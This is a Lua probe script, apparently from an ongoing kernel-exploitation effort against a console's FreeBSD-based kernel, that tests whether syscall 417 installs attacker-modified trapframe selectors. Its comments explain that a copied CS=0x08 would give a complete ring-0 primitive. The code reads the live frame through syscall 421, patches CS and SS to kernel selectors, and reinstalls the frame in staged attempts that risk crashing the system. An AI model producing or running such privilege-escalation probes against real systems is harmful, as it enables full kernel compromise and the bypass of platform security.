-- CRASH_CLASS: RISKY (a CS that 417 does not mask returns to ring 0 at a user
-- RIP and takes the console down; every stage is marked on the wire first)
-- PROBE 1358a: syscall 417 - does it copy the trapframe's SELECTORS?
--
-- 816a (results/phase17_new_vectors/816a_rflags_iopl_20261026_123814.txt)
-- established the mechanics: 421 fills a user buffer with the LIVE trapframe,
-- 417 copies it back into [td+0x460]. On this thread the live values are
-- CS=0x43, SS=0x3B, RFLAGS=0x202, and 417 refuses any RFLAGS that differs from
-- the live value in the bits outside its cookie mask 0xFFDAB22A - 816a set
-- IOPL and got -1, i.e. the frame was rejected before installation.
--
-- That refusal is about RFLAGS only. Nobody ever changed CS or SS:
-- probes/phase17_new_vectors/1166a_417_selector_control.lua was written for
-- exactly this and died at line 70 on a Lua format bug before its first call
-- (results/phase17_new_vectors/1166a_417_selector_control_20261104_153445.txt),
-- so the selector question has never been measured.
--
-- Why it matters: the return from the kernel to userland after a frame install
-- is an iretq that takes its target CPL from the frame's CS. If CS is copied
-- verbatim, CS=0x08 puts this thread at CPL0 with every general register, RIP,
-- RSP and RFLAGS under our control - a complete ring-0 primitive on a kernel
-- whose image base is already known (STATE.md). If 417 masks CS and SS the way
-- the thr_create path masks its selector (448a/452a measured the child staying
-- at CPL3), the frame is normalised and this class is closed.
--
-- Order and risk: [A] reads the live frame, [B] installs it unchanged as a
-- mechanics control (RFLAGS untouched, so the cookie check passes), [C] changes
-- only CS to the ring-0 code selector, [D] only SS, [E] both. Each stage prints
-- a marker before its call, so a -1 means "validated, class closed", a console
-- death means "copied, ring 0", and continued output means "masked, harmless".
--
-- -- prior art:
--   results/phase17_new_vectors/816a_rflags_iopl_20261026_123814.txt
--   probes/phase17_new_vectors/816a_rflags_iopl.lua:50-95
--   probes/phase17_new_vectors/1166a_417_selector_control.lua:1-40 (never ran)
--   results/phase17_new_vectors/1166a_417_selector_control_20261104_153445.txt (format bug)
--   docs/SYSENT_PRESENCE_14_10.md:440 (417 present, -1 on six zeros)
--   CLAUDE.md "448a/452a": thr_create's selector is masked on 14.10

if _G.__p1358_ran then
    print("[!] RE-ENTRY after a frame install - the old RIP resumed. Stopping here.")
    print("=== PROBE 1358a RE-ENTRY ===")
    return
end
_G.__p1358_ran = true

print("=== PROBE 1358a: 417 FRAME SELECTORS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function rdq(addr)
    local ok, v = pcall(function() return memory.read_qword(addr) end)
    if not ok or v == nil then return 0 end
    return to_num(v)
end
local function wrq(addr, val)
    pcall(function() memory.write_qword(addr, val) end)
end
local function sgn(val)
    local ok, h, l = pcall(function() return val.h, val.l end)
    if ok and type(h) == "number" and type(l) == "number" then
        local lo = l % 0x100000000
        if lo == 0xFFFFFFFF and (h % 0x100000000) == 0xFFFFFFFF then return "-1" end
        return string.format("0x%X_%08X", h % 0x100000000, lo)
    end
    if type(val) == "number" then
        if val < 0 then return tostring(val) end
        return string.format("0x%X", val)
    end
    return tostring(val)
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function u64v(v) return uint64(string.format("0x%X", v)) end

local sc421 = make_syscall(421)
local sc417 = make_syscall(417)
local getpid = make_syscall(20)

print(string.format("[0] pid=%d", to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local F = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(F + off, 0) end
print(string.format("  frame=0x%X", to_num(F)))

local function readframe(tag)
    local ok, r = pcall(function() return sc421(uint64(F)) end)
    if not ok then
        print(string.format("  %s 421 EXC", tag))
        return nil
    end
    local cs   = rdq(F + 0xE8)
    local ss   = rdq(F + 0x100)
    local rip  = rdq(F + 0xE0)
    local rsp  = rdq(F + 0xF8)
    local fl   = rdq(F + 0xF0)
    print(string.format("  %s 421 ret=%s RIP=0x%X CS=0x%X RFLAGS=0x%X RSP=0x%X SS=0x%X",
        tag, sgn(r), rip, cs, fl, rsp, ss))
    return { cs = cs, ss = ss, rip = rip, rsp = rsp, fl = fl }
end
local function install(tag)
    local ok, r = pcall(function() return sc417(uint64(F)) end)
    if not ok then
        print(string.format("  %s 417 EXC", tag))
        return nil
    end
    print(string.format("  %s 417 ret=%s errno=%s", tag, sgn(r), es()))
    return sgn(r)
end

print("")
print("[A] live frame")
local f0 = readframe("[A]")
if f0 == nil or f0.cs ~= 0x43 then
    print("[A] frame does not look like a user trapframe; aborting")
    print("=== PROBE 1358a STOP ===")
    return
end

print("")
print("[B] control: install the frame unchanged (RFLAGS untouched, cookie passes)")
readframe("[B]")
print("  calling 417 unchanged ...")
local rB = install("[B]")

print("")
print("[C] ring-0 code selector in CS, everything else untouched")
local f1 = readframe("[C]")
if f1 then
    wrq(F + 0xE8, u64v(0x08))
    print(string.format("  CS patched 0x%X -> 0x08; RIP stays 0x%X", f1.cs, f1.rip))
    print("  calling 417 with CS=0x08 ...")
    local rC = install("[C]")
    if rC ~= nil then
        local after = readframe("[C-after]")
        if after then
            print(string.format("  CS readback = 0x%X (%s)", after.cs,
                (after.cs == 0x08) and "copied" or "forced back to a user selector"))
        end
    end
end

print("")
print("[D] ring-0 data selector in SS only")
local f2 = readframe("[D]")
if f2 then
    wrq(F + 0x100, u64v(0x10))
    print(string.format("  SS patched 0x%X -> 0x10", f2.ss))
    print("  calling 417 with SS=0x10 ...")
    install("[D]")
end

print("")
print("[E] both selectors ring 0, last stage")
local f3 = readframe("[E]")
if f3 then
    wrq(F + 0xE8, u64v(0x08))
    wrq(F + 0x100, u64v(0x10))
    print("  calling 417 with CS=0x08 SS=0x10 ...")
    install("[E]")
end

print("")
print(string.format("[Z] alive pid=%d", to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))
print("=== PROBE 1358a COMPLETE ===")
